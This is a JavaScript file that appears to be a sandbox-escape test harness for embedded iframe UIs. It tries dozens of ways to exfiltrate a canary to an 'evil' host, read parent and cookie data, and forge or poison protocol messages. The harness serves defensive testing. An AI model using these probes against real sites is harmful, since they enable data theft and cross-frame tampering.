(() => {
  const params = new URLSearchParams(location.hash.slice(1));
  const attack = params.get("a") || "benign-result";
  const evil = params.get("e");
  const udp = params.get("u");
  const tag = params.get("t");
  const base = location.href.replace(/#.*$/, "").replace(/[^/]*$/, "");
  const report = (step, value) => { console.log("LAB " + JSON.stringify({ tag, attack, step, value: value === undefined ? null : String(value).slice(0, 300) })); };
  const out = (vector, canary) => `${evil}/${tag}/${vector}?c=${encodeURIComponent(canary || "none")}`;
  const tryIt = (step, fn) => { try { const value = fn(); report(step, value === undefined ? "ok" : value); return value; } catch (error) { report(step, "threw:" + (error && error.name)); return undefined; } };
  const add = (tagName, props) => { const el = document.createElement(tagName); Object.assign(el, props); (document.body || document.documentElement).append(el); return el; };
  const later = (fn, ms) => setTimeout(fn, ms);

  if (attack === "nav-before-load") { location.href = `${evil}/${tag}/evil-page.html`; return; }

  let port = null;
  let identity = null;
  let seq = 0;
  const send = (type, body, overrides = {}) => { seq += 1; port.postMessage({ ...identity, seq, type, body, ...overrides }); };

  const run = canary => {
    switch (attack) {
      case "benign-result":
        send("ui:resize", { height: 120 });
        send("ui:navigate", { target: { kind: "object", ref: { adapterId: identity.adapterId, connectionId: identity.connectionId, objectType: "task", canonicalId: "task-1" } } });
        return report("done", "benign");
      case "benign-editor":
        send("draft:change", { draftId: "draft-1", baseRevision: 1, changes: [{ pointer: "/title", change: { kind: "set", value: "Edited in frame" } }] });
        send("action:propose", { draftId: "draft-1", revision: 2 });
        return report("done", "benign");
      case "legit-assets": {
        const probeEl = add("div", { className: "lab-styled" });
        later(() => {
          report("css", getComputedStyle(probeEl).color);
          const pixel = document.getElementById("lab-pixel");
          report("image", pixel && pixel.complete && pixel.naturalWidth > 0 ? "loaded" : "failed");
          document.fonts.load("16px LabFont").then(faces => report("font", faces.length ? "loaded" : "none"), () => report("font", "failed"));
          const mod = add("script", { type: "module", src: base + "module.js" });
          mod.onerror = () => report("module", "failed");
          report("done", "assets");
        }, 50);
        return;
      }
      case "parent-dom-read": tryIt("read", () => parent.document.title); break;
      case "parent-dom-write": tryIt("write", () => { parent.document.body.dataset.labPwned = tag; return "wrote"; }); break;
      case "top-dom-read": tryIt("read", () => top.document.title); break;
      case "parent-location-read": tryIt("read", () => parent.location.href); break;
      case "storage-local": tryIt("read", () => localStorage.getItem("lab-canary")); break;
      case "storage-session": tryIt("read", () => sessionStorage.getItem("lab-canary")); break;
      case "storage-cookie": tryIt("read", () => document.cookie || "empty"); break;
      case "storage-indexeddb": tryIt("open", () => { const r = indexedDB.open("lab"); r.onsuccess = () => report("opened", "yes"); r.onerror = () => report("opened", "error"); return "requested"; }); break;
      case "storage-cache": tryIt("open", () => { caches.open("lab").then(() => report("opened", "yes"), e => report("opened", "rejected:" + e.name)); return "requested"; }); break;
      case "fetch-remote": tryIt("fetch", () => { fetch(out("fetch", canary), { mode: "no-cors" }).then(() => report("settled", "resolved"), e => report("settled", "rejected:" + e.name)); }); break;
      case "fetch-host-api": tryIt("fetch", () => { fetch(location.origin + "/api/desk/adapters/catalog").then(r => r.text()).then(t => report("read", t.slice(0, 80)), e => report("settled", "rejected:" + e.name)); }); break;
      case "xhr-remote": tryIt("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", out("xhr", canary)); x.send(); }); break;
      case "websocket-remote": tryIt("ws", () => { new WebSocket(out("ws", canary).replace(/^http/, "ws")); }); break;
      case "eventsource-remote": tryIt("es", () => { new EventSource(out("es", canary)); }); break;
      case "beacon-remote": tryIt("beacon", () => navigator.sendBeacon(out("beacon", canary), "x")); break;
      case "image-remote": tryIt("img", () => { add("img", { src: out("img", canary) }); }); break;
      case "image-host-api": tryIt("img", () => { const i = add("img", { src: location.origin + "/api/desk/adapters/catalog" }); i.onerror = () => report("load", "error-event"); i.onload = () => report("load", "load-event"); }); break;
      case "style-remote": tryIt("link", () => { add("link", { rel: "stylesheet", href: out("style", canary) }); }); break;
      case "style-attr-beacon": tryIt("cssom", () => { add("div").style.backgroundImage = `url("${out("style-attr", canary)}")`; }); break;
      case "css-import": tryIt("import", () => { const s = add("style"); s.sheet.insertRule(`@import url("${out("css-import", canary)}");`, 0); }); break;
      case "font-remote": tryIt("fontface", () => { new FontFace("Evil", `url("${out("font", canary)}")`).load().then(() => report("loaded", "yes"), e => report("loaded", "rejected:" + e.name)); }); break;
      case "prefetch": tryIt("prefetch", () => { add("link", { rel: "prefetch", href: out("prefetch", canary) }); }); break;
      case "preconnect": tryIt("preconnect", () => { add("link", { rel: "preconnect", href: `${evil}` }); add("link", { rel: "dns-prefetch", href: `${evil}` }); }); break;
      case "media-remote": tryIt("audio", () => { add("audio", { src: out("audio", canary), preload: "auto" }); }); break;
      case "object-remote": tryIt("object", () => { add("object", { data: out("object", canary) }); }); break;
      case "nested-frame": tryIt("iframe", () => { add("iframe", { src: out("iframe", canary) }); }); break;
      case "script-remote": tryIt("script", () => { add("script", { src: out("script", canary) }); }); break;
      case "import-remote": tryIt("import", () => { import(out("import", canary)).then(() => report("settled", "resolved"), e => report("settled", "rejected:" + e.name)); }); break;
      case "anchor-ping": tryIt("ping", () => { add("a", { href: "#x", ping: out("ping", canary) }).click(); }); break;
      case "webrtc-stun": tryIt("rtc", () => {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:${udp}` }] });
        pc.createDataChannel("x");
        pc.onicecandidate = e => { if (e.candidate) report("candidate", e.candidate.type); };
        pc.createOffer().then(o => pc.setLocalDescription(o)).then(() => report("offer", "set"), e => report("offer", "rejected:" + e.name));
        return "created";
      }); break;
      case "worker-same": tryIt("worker", () => { const w = new Worker(base + "worker.js#" + encodeURIComponent(out("worker", canary))); w.onerror = () => report("error", "error-event"); w.onmessage = m => report("message", m.data); return "constructed"; }); break;
      case "worker-blob": tryIt("worker", () => { const w = new Worker(URL.createObjectURL(new Blob([`fetch(${JSON.stringify(out("worker-blob", canary))},{mode:"no-cors"});postMessage("ran")`], { type: "text/javascript" }))); w.onerror = () => report("error", "error-event"); w.onmessage = m => report("message", m.data); return "constructed"; }); break;
      case "worker-data": tryIt("worker", () => { const w = new Worker("data:text/javascript," + encodeURIComponent(`fetch(${JSON.stringify(out("worker-data", canary))},{mode:"no-cors"});postMessage("ran")`)); w.onerror = () => report("error", "error-event"); w.onmessage = m => report("message", m.data); return "constructed"; }); break;
      case "shared-worker": tryIt("worker", () => { const w = new SharedWorker(base + "worker.js#" + encodeURIComponent(out("shared-worker", canary))); w.onerror = () => report("error", "error-event"); return "constructed"; }); break;
      case "service-worker": tryIt("sw", () => { navigator.serviceWorker.register(base + "worker.js").then(() => report("registered", "yes"), e => report("registered", "rejected:" + e.name)); return "requested"; }); break;
      case "nav-remote": tryIt("nav", () => { location.href = out("nav", canary); }); break;
      case "nav-data": tryIt("nav", () => { location.href = "data:text/html," + encodeURIComponent(`<img src="${out("nav-data", canary)}">`); }); break;
      case "nav-blob": tryIt("nav", () => { location.href = URL.createObjectURL(new Blob([`<img src="${out("nav-blob", canary)}">`], { type: "text/html" })); }); break;
      case "nav-javascript": tryIt("nav", () => { location.href = `javascript:void(new Image().src=${JSON.stringify(out("nav-js", canary))})`; }); break;
      case "nav-redirect": tryIt("nav", () => { location.href = `${location.origin}${params.get("r")}?to=${encodeURIComponent(out("nav-redirect", canary))}`; }); break;
      case "nav-gateway-redirect": tryIt("nav", () => { location.href = `${base}__expired__/view.html?to=${encodeURIComponent(out("nav-gw-redirect", canary))}`; }); break;
      case "image-gateway-redirect": tryIt("img", () => { add("img", { src: `${base}__expired__/x.png?to=${encodeURIComponent(out("img-gw-redirect", canary))}` }); }); break;
      case "nav-same-generation": tryIt("nav", () => { location.href = base + "app.css"; }); break;
      case "nav-host-page": tryIt("nav", () => { location.href = location.origin + "/"; }); break;
      case "meta-refresh": tryIt("meta", () => { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = `0;url=${out("meta-refresh", canary)}`; document.head.append(m); }); break;
      case "anchor-click": tryIt("click", () => { add("a", { href: out("anchor", canary) }).click(); }); break;
      case "top-nav": tryIt("nav", () => { top.location.href = out("top-nav", canary); }); break;
      case "top-nav-link": tryIt("click", () => { add("a", { href: out("top-link", canary), target: "_top" }).click(); }); break;
      case "popup": tryIt("open", () => String(window.open(out("popup", canary)))); break;
      case "popup-link": tryIt("click", () => { add("a", { href: out("popup-link", canary), target: "_blank" }).click(); }); break;
      case "form-post": tryIt("submit", () => { const f = add("form", { method: "POST", action: out("form-post", canary) }); f.submit(); }); break;
      case "form-top": tryIt("submit", () => { const f = add("form", { method: "GET", action: out("form-top", canary), target: "_top" }); f.submit(); }); break;
      case "download-asset": tryIt("click", () => { add("a", { href: base + "pixel.png", download: "x.png" }).click(); }); break;
      case "download-blob": tryIt("click", () => { add("a", { href: URL.createObjectURL(new Blob([canary])), download: "x.txt" }).click(); }); break;
      case "msg-ambient-parent": tryIt("post", () => { parent.postMessage({ ...identity, seq: 99, type: "action:propose", body: { draftId: "draft-1", revision: 2 } }, "*"); }); break;
      case "msg-ambient-top": tryIt("post", () => { top.postMessage({ ...identity, seq: 99, type: "draft:change", body: { draftId: "draft-1", baseRevision: 1, changes: [{ pointer: "/title", change: { kind: "set", value: "forged" } }] } }, "*"); }); break;
      case "msg-second-port": tryIt("post", () => { const c = new MessageChannel(); parent.postMessage({ ...identity, seq: 1, type: "ui:ready", body: { mount: params.get("m") ? JSON.parse(params.get("m")) : {} } }, "*", [c.port2]); c.port1.postMessage({ ...identity, seq: 2, type: "action:propose", body: { draftId: "draft-1", revision: 2 } }); }); break;
      case "msg-unknown-type": send("action:execute", { draftId: "draft-1" }); break;
      case "msg-extra-field": send("ui:resize", { height: 10, grant: true }); break;
      case "msg-extra-envelope": send("ui:resize", { height: 10 }, { authority: "host" }); break;
      case "msg-wrong-instance": send("draft:change", { draftId: "draft-1", baseRevision: 1, changes: [{ pointer: "/title", change: { kind: "set", value: "x" } }] }, { instance: "0".repeat(32) }); break;
      case "msg-wrong-release": send("draft:change", { draftId: "draft-1", baseRevision: 1, changes: [{ pointer: "/title", change: { kind: "set", value: "x" } }] }, { releaseDigest: "f".repeat(64) }); break;
      case "msg-wrong-generation": send("draft:change", { draftId: "draft-1", baseRevision: 1, changes: [{ pointer: "/title", change: { kind: "set", value: "x" } }] }, { generationId: "other-generation" }); break;
      case "msg-wrong-connection": send("draft:change", { draftId: "draft-1", baseRevision: 1, changes: [{ pointer: "/title", change: { kind: "set", value: "x" } }] }, { connectionId: "other-connection" }); break;
      case "msg-wrong-version": send("ui:resize", { height: 10 }, { version: "1.0.0-prototype" }); break;
      case "msg-replay": { send("ui:resize", { height: 10 }); seq -= 1; send("ui:resize", { height: 11 }); break; }
      case "msg-oversized": send("ui:resize", { height: 10, pad: "x".repeat(70_000) }); break;
      case "msg-malformed": port.postMessage("hello"); break;
      case "msg-non-plain": seq += 1; port.postMessage({ ...identity, seq, type: "ui:resize", body: { height: new Map() } }); break;
      case "msg-proto-key": seq += 1; port.postMessage(JSON.parse(`{"__proto__":{"admin":true},"protocol":"desk-ui","version":"1.0.0","instance":"${identity.instance}","adapterId":"${identity.adapterId}","connectionId":"${identity.connectionId}","generationId":"${identity.generationId}","releaseDigest":"${identity.releaseDigest}","seq":${seq},"type":"ui:resize","body":{"height":1}}`)); break;
      case "msg-editor-only": send("action:propose", { draftId: "draft-1", revision: 2 }); break;
      case "msg-cross-connection": send("ui:navigate", { target: { kind: "object", ref: { adapterId: identity.adapterId, connectionId: "other-connection", objectType: "task", canonicalId: "task-1" } } }); break;
      case "msg-after-close": send("ui:resize", { height: 10 }, { pad: 1 }); later(() => { try { send("action:propose", { draftId: "draft-1", revision: 2 }); report("post-after-close", "sent"); } catch (e) { report("post-after-close", "threw:" + e.name); } }, 200); break;
      default: report("unknown-attack", attack);
    }
    later(() => report("done", attack), 900);
  };

  window.addEventListener("message", event => {
    if (port || event.source !== parent || !event.data || event.data.type !== "host:init" || event.ports.length !== 1) return;
    port = event.ports[0];
    const { protocol, version, instance, adapterId, connectionId, generationId, releaseDigest } = event.data;
    identity = { protocol, version, instance, adapterId, connectionId, generationId, releaseDigest };
    report("init", "received");
    port.onmessage = m => {
      const data = m.data || {};
      if (data.type === "host:projection") run(data.body && data.body.object && data.body.object.title);
      if (data.type === "host:reply") report("reply", data.body.outcome);
      if (data.type === "host:close") report("closed", data.body.reason);
    };
    port.start();
    if (attack === "msg-before-ready") { send("draft:change", { draftId: "draft-1", baseRevision: 1, changes: [{ pointer: "/title", change: { kind: "set", value: "x" } }] }); return; }
    send("ui:ready", { mount: event.data.body.mount });
  });
  report("loaded", base);
})();
